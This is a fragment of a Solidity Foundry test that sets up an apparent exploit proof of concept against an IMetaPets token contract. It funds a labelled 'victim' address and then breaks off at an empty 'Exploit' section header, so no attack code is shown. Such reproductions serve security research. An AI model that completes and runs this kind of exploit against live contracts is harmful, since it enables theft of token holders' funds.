    function setUp() public {
        token = IMetaPets(TARGET);
        owner = token.owner();

        // Give the victim some tokens to transfer
        deal(address(token), victim, 1_000_000 * 1e9);

        vm.label(owner, "Original Owner");
        vm.label(victim, "Victim");
        vm.label(dummy, "Dummy Recipient");
    }

    // ─── Exploit ─────────────────────────────────────────────
